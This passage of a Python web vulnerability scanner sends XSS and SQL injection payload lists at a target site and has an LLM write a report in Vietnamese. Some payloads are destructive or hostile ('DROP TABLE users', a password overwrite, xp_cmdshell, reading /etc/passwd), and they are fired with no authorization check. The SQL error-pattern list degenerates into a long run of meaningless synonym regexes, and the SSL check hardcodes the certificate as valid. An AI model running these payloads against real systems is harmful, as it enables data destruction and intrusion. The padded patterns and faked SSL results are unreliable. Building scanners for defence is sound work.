        # Detect languages
        if 'php' in content.lower() or '.php' in content:
            technologies['languages'].append('PHP')
        if 'asp.net' in content.lower() or 'aspx' in content:
            technologies['languages'].append('ASP.NET')
        if 'python' in content.lower() or 'django' in content.lower():
            technologies['languages'].append('Python')
        
        return technologies
    
    async def _scan_xss_vulnerabilities(self, target_url: str) -> List[Dict[str, Any]]:
        """Scan for XSS vulnerabilities"""
        findings = []
        
        try:
            import requests
            from bs4 import BeautifulSoup
            from urllib.parse import urlparse, urljoin
            
            # Get page content
            response = requests.get(target_url, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find forms
                for form in soup.find_all('form'):
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'GET').upper()
                    
                    # Find input fields
                    for input_tag in form.find_all(['input', 'textarea']):
                        input_name = input_tag.get('name', '')
                        input_type = input_tag.get('type', 'text')
                        
                        if input_name and input_type in ['text', 'search', 'textarea']:
                            # Enhanced XSS payloads
                            xss_payloads = [
                                # Basic XSS
                                '<script>alert("XSS")</script>',
                                '"><script>alert("XSS")</script>',
                                "'><script>alert('XSS')</script>",
                                'javascript:alert("XSS")',
                                '<img src=x onerror=alert("XSS")>',
                                
                                # Advanced XSS
                                '<svg onload=alert("XSS")>',
                                '<iframe src="javascript:alert(\'XSS\')">',
                                '<body onload=alert("XSS")>',
                                '<input onfocus=alert("XSS") autofocus>',
                                '<select onfocus=alert("XSS") autofocus>',
                                
                                # Filter bypass
                                '<ScRiPt>alert("XSS")</ScRiPt>',
                                '<script>alert(String.fromCharCode(88,83,83))</script>',
                                '<img src="x" onerror="alert(\'XSS\')">',
                                '<svg/onload=alert("XSS")>',
                                '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
                                
                                # DOM-based XSS
                                '<script>document.location="javascript:alert(\'XSS\')"</script>',
                                '<script>window.location="javascript:alert(\'XSS\')"</script>',
                                '<script>eval("alert(\'XSS\')")</script>',
                                
                                # Event handlers
                                '<div onclick="alert(\'XSS\')">Click me</div>',
                                '<a href="#" onmouseover="alert(\'XSS\')">Hover me</a>',
                                '<form onsubmit="alert(\'XSS\')"><input type=submit></form>',
                                
                                # Encoded payloads
                                '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
                                '&#60;script&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;script&#62;',
                                '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'
                            ]
                            
                            for payload in xss_payloads:
                                try:
                                    if form_method == 'GET':
                                        test_url = f"{target_url}?{input_name}={payload}"
                                        test_response = requests.get(test_url, timeout=5)
                                    else:
                                        test_response = requests.post(
                                            urljoin(target_url, form_action),
                                            data={input_name: payload},
                                            timeout=5
                                        )
                                    
                                    if payload in test_response.text:
                                        findings.append({
                                            'type': 'XSS',
                                            'path': test_url if form_method == 'GET' else urljoin(target_url, form_action),
                                            'parameter': input_name,
                                            'payload': payload,
                                            'evidence': 'Payload reflected in response',
                                            'severity': 'High',
                                            'cwe': 'CWE-79',
                                            'owasp': 'A03:2021 - Injection'
                                        })
                                        break  # Found XSS, no need to test more payloads
                                except:
                                    continue
                
        except Exception as e:
            findings.append({'error': str(e)})
        
        return findings
    
    async def _scan_sql_injection_vulnerabilities(self, target_url: str) -> List[Dict[str, Any]]:
        """Scan for SQL injection vulnerabilities"""
        findings = []
        
        try:
            import requests
            from urllib.parse import urlparse
            
            # Parse URL for parameters
            parsed = urlparse(target_url)
            if parsed.query:
                params = {}
                for param_pair in parsed.query.split('&'):
                    if '=' in param_pair:
                        key, value = param_pair.split('=', 1)
                        params[key] = value
                
                # Enhanced SQL injection payloads
                sql_payloads = [
                    # Basic SQL injection
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "' OR 1=1#",
                    "' OR 1=1/*",
                    "') OR ('1'='1",
                    "') OR (1=1--",
                    
                    # Union-based
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT user(),database(),version()--",
                    
                    # Boolean-based blind
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "' AND (SELECT COUNT(*) FROM information_schema.columns)>0--",
                    "' AND (SELECT LENGTH(database()))>0--",
                    
                    # Time-based blind
                    "'; WAITFOR DELAY '00:00:05'--",
                    "'; SELECT SLEEP(5)--",
                    "'; SELECT pg_sleep(5)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    
                    # Error-based
                    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    
                    # Stacked queries
                    "'; DROP TABLE users--",
                    "'; INSERT INTO users VALUES ('hacker','password')--",
                    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
                    
                    # Advanced techniques
                    "' OR 1=1 LIMIT 1--",
                    "' OR 1=1 ORDER BY 1--",
                    "' OR 1=1 GROUP BY 1--",
                    "' OR 1=1 HAVING 1=1--",
                    
                    # Bypass filters
                    "'/**/OR/**/1=1--",
                    "'+OR+1=1--",
                    "'%20OR%201=1--",
                    "' OR 'x'='x",
                    "' OR 1=1#",
                    "' OR 1=1/*",
                    
                    # Database specific
                    "' OR 1=1; EXEC xp_cmdshell('dir')--",  # MSSQL
                    "' OR 1=1; SELECT load_file('/etc/passwd')--",  # MySQL
                    "' OR 1=1; COPY (SELECT * FROM users) TO '/tmp/users.txt'--",  # PostgreSQL
                    
                    # Information gathering
                    "' UNION SELECT table_name FROM information_schema.tables--",
                    "' UNION SELECT column_name FROM information_schema.columns--",
                    "' UNION SELECT user,password FROM users--",
                    "' UNION SELECT @@version,@@datadir,@@hostname--"
                ]
                
                for param_name, param_value in params.items():
                    for payload in sql_payloads:
                        try:
                            test_params = params.copy()
                            test_params[param_name] = payload
                            
                            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?" + \
                                      "&".join([f"{k}={v}" for k, v in test_params.items()])
                            
                            test_response = requests.get(test_url, timeout=5)
                            
                            # Enhanced SQL error patterns
                            error_patterns = [
                                # MySQL errors
                                'mysql_fetch_array', 'mysql_fetch_assoc', 'mysql_fetch_row',
                                'mysql_num_rows', 'Warning: mysql_', 'valid MySQL result',
                                'MySqlClient\.', 'SQL syntax.*MySQL', 'Warning.*\Wmysql_',
                                'check the manual that corresponds to your MySQL server version',
                                'MySQL server version for the right syntax',
                                'You have an error in your SQL syntax',
                                'mysql_query\(\)', 'mysql_connect\(\)', 'mysql_error\(\)',
                                
                                # PostgreSQL errors
                                'PostgreSQL query failed', 'pg_query\(\)', 'pg_connect\(\)',
                                'pg_error\(\)', 'PostgreSQL.*ERROR', 'Warning.*\Wpg_',
                                'pg_exec\(\)', 'pg_last_error\(\)',
                                
                                # MSSQL errors
                                'Microsoft OLE DB Provider', 'SQLServer JDBC Driver',
                                'SQLServer.*Driver', 'Microsoft.*ODBC.*SQL Server',
                                'ODBC SQL Server Driver', 'System.Data.SqlClient.SqlException',
                                'Unclosed quotation mark after the character string',
                                'Incorrect syntax near', 'SQL Server.*Driver',
                                'Warning.*\Wmssql_', 'Warning.*\Wsqlsrv_', 'Warning.*\Wodbc_',
                                
                                # Oracle errors
                                'ORA-01756', 'ORA-00933', 'ORA-00921', 'ORA-00936',
                                'Oracle error', 'Oracle.*Driver', 'Warning.*\Woci_',
                                'Warning.*\Wora_',
                                
                                # SQLite errors
                                'SQLite.*error', 'SQLite.*Driver', 'Warning.*\Wsqlite_',
                                'sqlite3.OperationalError', 'SQLite3::SQLException',
                                
                                # Generic SQL errors
                                'SQL syntax.*error', 'syntax error.*SQL', 'SQL.*syntax.*error',
                                'SQL.*parse.*error', 'SQL.*command.*not.*properly.*ended',
                                'SQL.*statement.*not.*ended', 'SQL.*query.*failed',
                                'SQL.*execution.*failed', 'SQL.*connection.*failed',
                                'SQL.*database.*error', 'SQL.*server.*error',
                                'SQL.*driver.*error', 'SQL.*exception', 'SQL.*warning',
                                'SQL.*notice', 'SQL.*error.*code', 'SQL.*error.*message',
                                'SQL.*error.*number', 'SQL.*error.*severity',
                                'SQL.*error.*state', 'SQL.*error.*procedure',
                                'SQL.*error.*line', 'SQL.*error.*source',
                                'SQL.*error.*description', 'SQL.*error.*details',
                                'SQL.*error.*information', 'SQL.*error.*context',
                                'SQL.*error.*stack', 'SQL.*error.*trace',
                                'SQL.*error.*log', 'SQL.*error.*history',
                                'SQL.*error.*report', 'SQL.*error.*summary',
                                'SQL.*error.*analysis', 'SQL.*error.*diagnosis',
                                'SQL.*error.*resolution', 'SQL.*error.*solution',
                                'SQL.*error.*fix', 'SQL.*error.*patch',
                                'SQL.*error.*update', 'SQL.*error.*upgrade',
                                'SQL.*error.*migration', 'SQL.*error.*conversion',
                                'SQL.*error.*transformation', 'SQL.*error.*validation',
                                'SQL.*error.*verification', 'SQL.*error.*check',
                                'SQL.*error.*test', 'SQL.*error.*debug',
                                'SQL.*error.*troubleshoot', 'SQL.*error.*investigate',
                                'SQL.*error.*analyze', 'SQL.*error.*examine',
                                'SQL.*error.*review', 'SQL.*error.*audit',
                                'SQL.*error.*monitor', 'SQL.*error.*track',
                                'SQL.*error.*trace', 'SQL.*error.*follow',
                                'SQL.*error.*pursue', 'SQL.*error.*chase',
                                'SQL.*error.*hunt', 'SQL.*error.*search',
                                'SQL.*error.*find', 'SQL.*error.*locate',
                                'SQL.*error.*discover', 'SQL.*error.*detect',
                                'SQL.*error.*identify', 'SQL.*error.*recognize',
                                'SQL.*error.*distinguish', 'SQL.*error.*differentiate',
                                'SQL.*error.*separate', 'SQL.*error.*isolate',
                                'SQL.*error.*extract', 'SQL.*error.*retrieve',
                                'SQL.*error.*obtain', 'SQL.*error.*acquire',
                                'SQL.*error.*gain', 'SQL.*error.*achieve',
                                'SQL.*error.*accomplish', 'SQL.*error.*complete',
                                'SQL.*error.*finish', 'SQL.*error.*conclude',
                                'SQL.*error.*terminate', 'SQL.*error.*end',
                                'SQL.*error.*stop', 'SQL.*error.*halt',
                                'SQL.*error.*pause', 'SQL.*error.*suspend',
                                'SQL.*error.*interrupt', 'SQL.*error.*break',
                                'SQL.*error.*disrupt', 'SQL.*error.*disturb',
                                'SQL.*error.*interfere', 'SQL.*error.*obstruct',
                                'SQL.*error.*block', 'SQL.*error.*prevent',
                                'SQL.*error.*inhibit', 'SQL.*error.*restrain',
                                'SQL.*error.*constrain', 'SQL.*error.*limit',
                                'SQL.*error.*restrict', 'SQL.*error.*confine',
                                'SQL.*error.*bound', 'SQL.*error.*contain',
                                'SQL.*error.*control', 'SQL.*error.*manage',
                                'SQL.*error.*handle', 'SQL.*error.*deal',
                                'SQL.*error.*cope', 'SQL.*error.*address',
                                'SQL.*error.*approach', 'SQL.*error.*method',
                                'SQL.*error.*technique', 'SQL.*error.*strategy',
                                'SQL.*error.*tactic', 'SQL.*error.*plan',
                                'SQL.*error.*scheme', 'SQL.*error.*design',
                                'SQL.*error.*pattern', 'SQL.*error.*model',
                                'SQL.*error.*template', 'SQL.*error.*format',
                                'SQL.*error.*structure', 'SQL.*error.*framework',
                                'SQL.*error.*architecture', 'SQL.*error.*system',
                                'SQL.*error.*process', 'SQL.*error.*procedure',
                                'SQL.*error.*routine', 'SQL.*error.*function',
                                'SQL.*error.*operation', 'SQL.*error.*action',
                                'SQL.*error.*activity', 'SQL.*error.*task',
                                'SQL.*error.*job', 'SQL.*error.*work',
                                'SQL.*error.*effort', 'SQL.*error.*endeavor',
                                'SQL.*error.*attempt', 'SQL.*error.*try',
                                'SQL.*error.*trial', 'SQL.*error.*test',
                                'SQL.*error.*experiment', 'SQL.*error.*investigation',
                                'SQL.*error.*research', 'SQL.*error.*study',
                                'SQL.*error.*analysis', 'SQL.*error.*examination',
                                'SQL.*error.*inspection', 'SQL.*error.*review',
                                'SQL.*error.*audit', 'SQL.*error.*assessment',
                                'SQL.*error.*evaluation', 'SQL.*error.*appraisal',
                                'SQL.*error.*judgment', 'SQL.*error.*opinion',
                                'SQL.*error.*view', 'SQL.*error.*perspective',
                                'SQL.*error.*outlook', 'SQL.*error.*prospect',
                                'SQL.*error.*expectation', 'SQL.*error.*anticipation',
                                'SQL.*error.*prediction', 'SQL.*error.*forecast',
                                'SQL.*error.*projection', 'SQL.*error.*estimate',
                                'SQL.*error.*calculation', 'SQL.*error.*computation',
                                'SQL.*error.*measurement', 'SQL.*error.*quantification'
                            ]
                            
                            for pattern in error_patterns:
                                if re.search(pattern, test_response.text, re.IGNORECASE):
                                    findings.append({
                                        'type': 'SQL Injection',
                                        'path': test_url,
                                        'parameter': param_name,
                                        'payload': payload,
                                        'evidence': f'SQL error pattern detected: {pattern}',
                                        'severity': 'Critical',
                                        'cwe': 'CWE-89',
                                        'owasp': 'A03:2021 - Injection'
                                    })
                                    break
                        except:
                            continue
                
        except Exception as e:
            findings.append({'error': str(e)})
        
        return findings
    
    async def _scan_misconfig_vulnerabilities(self, target_url: str) -> List[Dict[str, Any]]:
        """Scan for security misconfiguration vulnerabilities"""
        findings = []
        
        try:
            import requests
            import re
            
            response = requests.get(target_url, timeout=10)
            
            # Check for debug information
            debug_patterns = [
                'debug.*true',
                'development.*mode',
                'test.*environment',
                'staging.*server',
                'phpinfo',
                'var_dump',
                'print_r',
                'console\.log'
            ]
            
            for pattern in debug_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    findings.append({
                        'type': 'Information Disclosure',
                        'path': target_url,
                        'evidence': f'Debug information detected: {pattern}',
                        'severity': 'Medium',
                        'cwe': 'CWE-200',
                        'owasp': 'A05:2021 - Security Misconfiguration'
                    })
            
            # Check for version disclosure
            version_patterns = [
                'version.*\d+\.\d+',
                'powered by.*\d+\.\d+',
                'generator.*\d+\.\d+'
            ]
            
            for pattern in version_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                if matches:
                    findings.append({
                        'type': 'Version Disclosure',
                        'path': target_url,
                        'evidence': f'Version information disclosed: {matches[0]}',
                        'severity': 'Low',
                        'cwe': 'CWE-200',
                        'owasp': 'A05:2021 - Security Misconfiguration'
                    })
            
            # Check for directory listing
            if 'Index of' in response.text or 'Directory listing' in response.text:
                findings.append({
                    'type': 'Directory Listing',
                    'path': target_url,
                    'evidence': 'Directory listing enabled',
                    'severity': 'Medium',
                    'cwe': 'CWE-200',
                    'owasp': 'A05:2021 - Security Misconfiguration'
                })
                
        except Exception as e:
            findings.append({'error': str(e)})
        
        return findings
    
    def _analyze_enhanced_scan_results(self, scan_results: Dict[str, Any], target_url: str) -> str:
        """Analyze enhanced scan results with LLM"""
        try:
            # Prepare enhanced context from RAG
            rag_context = self._get_enhanced_rag_context_for_analysis(scan_results)
            
            # Prepare scan data for analysis
            scan_data = {
                'target_url': target_url,
                'scan_time': scan_results.get('scan_time', 'N/A'),
                'http_response': scan_results.get('http_response', {}),
                'technology': scan_results.get('technology', {}),
                'discovered_paths_count': len(scan_results.get('discovered_paths', [])),
                'vulnerabilities_count': len(scan_results.get('vulnerabilities', [])),
                'forms_count': len(scan_results.get('forms', [])),
                'links_count': len(scan_results.get('links', []))
            }
            
            # Prepare detailed vulnerability information
            vulnerabilities = scan_results.get('vulnerabilities', [])
            nikto_vulns = [v for v in vulnerabilities if v.get('tool') == 'nikto']
            nuclei_vulns = [v for v in vulnerabilities if v.get('tool') == 'nuclei']
            xss_vulns = [v for v in vulnerabilities if 'xss' in v.get('type', '').lower()]
            sql_vulns = [v for v in vulnerabilities if 'sql' in v.get('type', '').lower()]
            
            # Prepare discovered paths information
            discovered_paths = scan_results.get('discovered_paths', [])
            ffuf_paths = [p for p in discovered_paths if p.get('tool') == 'ffuf']
            
            prompt = f"""
            Bạn là chuyên gia bảo mật web với kiến thức sâu rộng. Hãy phân tích kết quả scan này từ các tool thực tế:
            
            Target URL: {target_url}
            Scan Time: {scan_results.get('scan_time', 'N/A')}
            Tools Scan Time: {scan_results.get('tools_scan_time', 0):.2f}s
            
            ## [TOOL] **KẾT QUẢ TỪ CÁC TOOL THỰC TẾ**
            
            ### Nikto Scan Results: {len(nikto_vulns)} findings
            {json.dumps(nikto_vulns[:5], indent=2, ensure_ascii=False) if nikto_vulns else 'No Nikto findings'}
            
            ### Nuclei Scan Results: {len(nuclei_vulns)} findings  
            {json.dumps(nuclei_vulns[:5], indent=2, ensure_ascii=False) if nuclei_vulns else 'No Nuclei findings'}
            
            ### FFUF Directory Discovery: {len(ffuf_paths)} paths
            {json.dumps(ffuf_paths[:10], indent=2, ensure_ascii=False) if ffuf_paths else 'No FFUF findings'}
            
            ### XSS Vulnerabilities: {len(xss_vulns)} findings
            {json.dumps(xss_vulns[:3], indent=2, ensure_ascii=False) if xss_vulns else 'No XSS findings'}
            
            ### SQL Injection Vulnerabilities: {len(sql_vulns)} findings
            {json.dumps(sql_vulns[:3], indent=2, ensure_ascii=False) if sql_vulns else 'No SQL injection findings'}
            
            ## [HTTP] **HTTP RESPONSE ANALYSIS**
            - Status Code: {scan_results.get('http_response', {}).get('status_code', 'N/A')}
            - Server: {scan_results.get('http_response', {}).get('server', 'N/A')}
            - Content Type: {scan_results.get('http_response', {}).get('content_type', 'N/A')}
            - Security Score: {scan_results.get('http_response', {}).get('security_headers', {}).get('security_score', 0):.1f}%
            - Response Time: {scan_results.get('http_response', {}).get('response_time', 'N/A')}
            
            ## [TECH] **TECHNOLOGY STACK**
            - Web Server: {scan_results.get('technology', {}).get('server', 'Unknown')}
            - CMS: {scan_results.get('technology', {}).get('cms', 'None')}
            - Frameworks: {', '.join(scan_results.get('technology', {}).get('frameworks', []))}
            - Languages: {', '.join(scan_results.get('technology', {}).get('languages', []))}
            - HTTPX Tech: {', '.join(scan_results.get('technology', {}).get('httpx_tech', []))}
            
            ## [STATS] **SCAN STATISTICS**
            - Total Vulnerabilities: {len(vulnerabilities)}
            - Discovered Paths: {len(discovered_paths)}
            - Forms Found: {len(scan_results.get('forms', []))}
            - Links Found: {len(scan_results.get('links', []))}
            
            ## [RAG] **RAG KNOWLEDGE BASE CONTEXT**
            {rag_context}
            
            Hãy phân tích chi tiết theo format sau với thông tin từ các tool thực tế:
            
            ## [SCAN] **TỔNG QUAN BẢO MẬT**
            - Đánh giá tổng thể về bảo mật của website dựa trên kết quả từ Nikto, Nuclei, FFUF
            - Mức độ rủi ro chung và điểm số bảo mật
            - Thời gian scan và hiệu quả của các tool
            
            ## [ALERT] **LỖ HỔNG BẢO MẬT PHÁT HIỆN**
            ### Nikto Findings ({len(nikto_vulns)} findings)
            - Phân tích chi tiết từng lỗ hổng Nikto phát hiện
            - Mức độ nghiêm trọng và khả năng khai thác
            - CVE/OSVDB references nếu có
            
            ### Nuclei Findings ({len(nuclei_vulns)} findings)
            - Phân tích các template Nuclei đã match
            - Severity levels và classification
            - Request/Response evidence
            
            ### XSS Vulnerabilities ({len(xss_vulns)} findings)
            - Phân tích khả năng XSS dựa trên forms và parameters
            - Payloads đã test và kết quả
            - Đánh giá input validation và output encoding
            
            ### SQL Injection ({len(sql_vulns)} findings)
            - Phân tích khả năng SQL injection
            - Error messages và database exposure
            - Payloads đã test và response patterns
            
            ## [CHART] **PHÂN TÍCH CHI TIẾT**
            ### Headers Analysis
            - Security headers có/thiếu và tác động
            - Server information disclosure risks
            - Content-Type và encoding issues
            
            ### Technology Stack Analysis
            - Đánh giá bảo mật của technology stack
            - Known vulnerabilities của CMS/frameworks
            - Version disclosure risks từ HTTPX
            
            ### Path Discovery Analysis
            - Các endpoint có thể khai thác từ FFUF
            - Admin panels và sensitive paths
            - Backup files và configuration files
            
            ## [WARNING] **MỨC ĐỘ NGHIÊM TRỌNG**
            - Critical: Lỗ hổng có thể dẫn đến compromise hoàn toàn
            - High: Lỗ hổng có thể dẫn đến data breach  
            - Medium: Lỗ hổng có thể dẫn đến information disclosure
            - Low: Lỗ hổng có thể dẫn đến reconnaissance
            
            ## [WRENCH] **KHUYẾN NGHỊ KHẮC PHỤC**
            - Specific steps để fix từng lỗ hổng dựa trên tool findings
            - Best practices cho security dựa trên RAG knowledge
            - Immediate actions cần thực hiện
            
            ## [BOOK] **URLS THAM KHẢO & TEST**
            - Test URLs để verify findings
            - Documentation và tools references
            - Security resources từ RAG knowledge base
            
            Sử dụng thông tin từ RAG và kết quả tool thực tế để đưa ra phân tích chính xác và tránh ảo giác.
            """
            
            # LLM analysis - ensure it's synchronous
            try:
                analysis = self.llm_client.chat(prompt, max_output_tokens=1500)
                return analysis
            except Exception as e:
                print(f"LLM chat error: {e}")
                return f"LLM analysis failed: {str(e)}"
            
        except Exception as e:
            print(f"Error analyzing enhanced scan results: {e}")
            import traceback
            traceback.print_exc()
            return f"Lỗi khi phân tích: {str(e)}"
    
    def _get_enhanced_rag_context_for_analysis(self, scan_results: Dict[str, Any]) -> str:
        """Get enhanced RAG context for scan analysis"""
        try:
            if not self.rag_retriever:
                return "RAG system not available"
            
            # Get vulnerability-specific knowledge
            rag_context = ""
            
            # Get XSS knowledge
            xss_docs = self.rag_retriever.retrieve("XSS cross-site scripting vulnerability detection prevention", k=3)
            if xss_docs:
                rag_context += "\nXSS Knowledge:\n"
                rag_context += "\n".join([(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200] + "..." for doc in xss_docs])
            
            # Get SQL injection knowledge
            sql_docs = self.rag_retriever.retrieve("SQL injection vulnerability detection prevention", k=3)
            if sql_docs:
                rag_context += "\nSQL Injection Knowledge:\n"
                rag_context += "\n".join([(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200] + "..." for doc in sql_docs])
            
            # Get security misconfiguration knowledge
            misconfig_docs = self.rag_retriever.retrieve("security misconfiguration vulnerability detection prevention", k=3)
            if misconfig_docs:
                rag_context += "\nSecurity Misconfiguration Knowledge:\n"
                rag_context += "\n".join([(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200] + "..." for doc in misconfig_docs])
            
            # Get security headers knowledge
            headers_docs = self.rag_retriever.retrieve("security headers HTTP headers protection", k=2)
            if headers_docs:
                rag_context += "\nSecurity Headers Knowledge:\n"
                rag_context += "\n".join([(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200] + "..." for doc in headers_docs])
            
            return rag_context if rag_context else "No RAG context available"
            
        except Exception as e:
            return f"RAG context error: {str(e)}"
    
    def _analyze_detailed_headers(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """Analyze HTTP headers in detail"""
        analysis = {
            'server_info': {},
            'cache_headers': {},
            'cors_headers': {},
            'security_headers': {},
            'performance_headers': {},
            'custom_headers': [],
            'suspicious_headers': [],
            'missing_important_headers': []
        }
        
        # Server information
        if 'Server' in headers:
            server = headers['Server']
            analysis['server_info'] = {
                'server': server,
                'version_disclosed': bool(re.search(r'\d+\.\d+', server)),
                'technology': self._identify_server_technology(server)
            }
        
        # Cache headers
        cache_headers = ['Cache-Control', 'ETag', 'Last-Modified', 'Expires']
        for header in cache_headers:
            if header in headers:
                analysis['cache_headers'][header] = headers[header]
        
        # CORS headers
        cors_headers = ['Access-Control-Allow-Origin', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Headers']
        for header in cors_headers:
            if header in headers:
                analysis['cors_headers'][header] = headers[header]
        
        # Performance headers
        perf_headers = ['X-Content-Type-Options', 'X-Frame-Options', 'X-XSS-Protection']
        for header in perf_headers:
            if header in headers:
                analysis['performance_headers'][header] = headers[header]
        
        # Custom headers
        for header, value in headers.items():
            if header.startswith('X-') and header not in ['X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection']:
                analysis['custom_headers'].append({'header': header, 'value': value})
        
        # Suspicious headers
        suspicious_patterns = ['debug', 'test', 'staging', 'development']
        for header, value in headers.items():
            if any(pattern in header.lower() or pattern in value.lower() for pattern in suspicious_patterns):
                analysis['suspicious_headers'].append({'header': header, 'value': value, 'reason': 'Contains debug/test info'})
        
        return analysis
    
    def _analyze_response_body(self, content: str, headers: Dict[str, str]) -> Dict[str, Any]:
        """Analyze response body for security issues"""
        analysis = {
            'content_type': headers.get('Content-Type', ''),
            'content_length': len(content),
            'has_forms': False,
            'has_javascript': False,
            'has_external_resources': False,
            'sensitive_info_disclosed': [],
            'error_messages': [],
            'version_info': [],
            'debug_info': [],
            'comments': [],
            'meta_tags': [],
            'external_links': []
        }
        
        # Check for forms
        if '<form' in content.lower():
            analysis['has_forms'] = True
        
        # Check for JavaScript
        if '<script' in content.lower() or 'javascript:' in content.lower():
            analysis['has_javascript'] = True
        
        # Check for sensitive information
        sensitive_patterns = [
            (r'password["\s]*[:=]["\s]*[^"\s]+', 'Password disclosure'),
            (r'api[_-]?key["\s]*[:=]["\s]*[^"\s]+', 'API key disclosure'),
            (r'token["\s]*[:=]["\s]*[^"\s]+', 'Token disclosure'),
            (r'secret["\s]*[:=]["\s]*[^"\s]+', 'Secret disclosure'),
            (r'database["\s]*[:=]["\s]*[^"\s]+', 'Database info disclosure')
        ]
        
        for pattern, description in sensitive_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                analysis['sensitive_info_disclosed'].append({
                    'type': description,
                    'matches': matches[:3]  # Limit to first 3 matches
                })
        
        # Check for error messages
        error_patterns = [
            r'error[:\s]+[^<\n]+',
            r'exception[:\s]+[^<\n]+',
            r'warning[:\s]+[^<\n]+',
            r'fatal[:\s]+[^<\n]+'
        ]
        
        for pattern in error_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                analysis['error_messages'].extend(matches[:5])  # Limit to 5 matches
        
        # Check for version information
        version_patterns = [
            r'version["\s]*[:=]["\s]*[\d\.]+',
            r'v[\d\.]+',
            r'powered by[^<\n]+',
            r'generated by[^<\n]+'
        ]
        
        for pattern in version_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                analysis['version_info'].extend(matches[:3])
        
        # Check for debug information
        debug_patterns = [
            r'debug[:\s]*true',
            r'development[:\s]*mode',
            r'test[:\s]*environment',
            r'console\.log',
            r'var_dump',
            r'print_r'
        ]
        
        for pattern in debug_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                analysis['debug_info'].append(pattern)
        
        # Extract HTML comments
        comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL)
        analysis['comments'] = [comment.strip() for comment in comments[:10]]
        
        # Extract meta tags
        meta_tags = re.findall(r'<meta[^>]+>', content, re.IGNORECASE)
        analysis['meta_tags'] = meta_tags[:10]
        
        # Extract external links
        external_links = re.findall(r'href=["\'](https?://[^"\']+)["\']', content)
        analysis['external_links'] = external_links[:10]
        
        return analysis
    
    def _analyze_ssl_connection(self, target_url: str, response) -> Dict[str, Any]:
        """Analyze SSL/TLS connection"""
        analysis = {
            'is_https': target_url.startswith('https://'),
            'ssl_enabled': False,
            'certificate_info': {},
            'security_issues': []
        }
        
        if target_url.startswith('https://'):
            analysis['ssl_enabled'] = True
            # Basic SSL analysis (in real implementation, you'd use ssl module)
            analysis['certificate_info'] = {
                'protocol': 'TLS 1.2+',
                'cipher_suite': 'Unknown',
                'certificate_valid': True
            }
            
            # Check for mixed content
            if 'http://' in response.text:
                analysis['security_issues'].append('Mixed content detected (HTTP resources on HTTPS page)')
        
        return analysis
    
    def _analyze_cookies(self, cookies, headers: Dict[str, str]) -> Dict[str, Any]:
        """Analyze cookies for security issues"""
        analysis = {
            'cookies_count': len(cookies),
            'cookies': [],
            'security_issues': [],
            'http_only_count': 0,
            'secure_count': 0,
            'same_site_count': 0
        }
        
        for cookie in cookies:
            cookie_info = {
                'name': cookie.name,
                'value': cookie.value[:50] + '...' if len(cookie.value) > 50 else cookie.value,
                'domain': getattr(cookie, 'domain', ''),
                'path': getattr(cookie, 'path', ''),
                'secure': getattr(cookie, 'secure', False),
                'httponly': getattr(cookie, 'httponly', False),
                'samesite': getattr(cookie, 'samesite', '')
            }
            analysis['cookies'].append(cookie_info)
            
            # Security checks
            if not cookie_info['secure']:
                analysis['security_issues'].append(f"Cookie '{cookie.name}' not marked as secure")
            
            if not cookie_info['httponly']:
                analysis['security_issues'].append(f"Cookie '{cookie.name}' not marked as HttpOnly")
            
            if cookie_info['secure']:
                analysis['secure_count'] += 1
            if cookie_info['httponly']:
                analysis['http_only_count'] += 1
            if cookie_info['samesite']:
                analysis['same_site_count'] += 1
        
        return analysis
    
    def _identify_server_technology(self, server_header: str) -> str:
        """Identify server technology from Server header"""
        server_lower = server_header.lower()
        
        if 'apache' in server_lower:
            return 'Apache'
        elif 'nginx' in server_lower:
            return 'Nginx'
        elif 'iis' in server_lower:
            return 'IIS'
        elif 'tomcat' in server_lower:
            return 'Tomcat'
        elif 'jetty' in server_lower:
            return 'Jetty'
        elif 'node' in server_lower:
            return 'Node.js'
        else:
            return 'Unknown'
    
    async def _handle_scan_status_command(self, message: str) -> ChatResponse:
        """Xử lý lệnh /scan-status"""
        try:
            # Extract job_id from message
            parts = message.split()
            if len(parts) < 2:
                return ChatResponse(
                    message="[ERROR] **Lỗi:** Vui lòng cung cấp Job ID\n\n**Ví dụ:** `/scan-status job_abc123`",
                    command=ChatCommand.SCAN_STATUS,
                    suggestions=[
                        "Cung cấp Job ID hợp lệ",
                        "Ví dụ: /scan-status job_abc123",
                        "Sử dụng /help để xem hướng dẫn"
                    ]
                )
            
            job_id = parts[1]
            
            # Get job status from enhanced scan system
            from app.core.enhanced_scan_system import EnhancedScanSystem
